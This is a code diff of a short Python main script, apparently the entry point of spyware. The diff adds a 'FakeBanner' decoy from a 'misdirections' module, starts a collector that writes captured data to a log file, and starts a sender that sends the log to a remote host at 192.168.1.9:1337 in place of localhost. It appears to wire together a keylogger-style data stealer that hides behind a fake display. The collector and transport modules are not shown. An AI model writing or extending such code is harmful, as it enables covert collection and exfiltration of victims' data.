@@ -1,15 +1,18 @@
+import osutils
 import collector
-# import banners
 import transport
+import misdirections 
 
-# banner = banners.Banner()
-# banner.show()
+logfile, imgpath = osutils.get_log_path(), osutils.get_img_path()
 
-logfile = "./logfile"
+fake_banner = misdirections.FakeBanner(imagepath=imgpath)
+fake_banner.show()
+
 c = collector.Collector(logfile=logfile)
-scheduler = transport.Sender(remote="http://127.0.0.1:1337", logfile=logfile)
-
-scheduler.start()
 c.start()
 
+sender = transport.Sender(remote="http://192.168.1.9:1337", logfile=logfile)
+sender.start()
+
 c.join()
+sender.join()
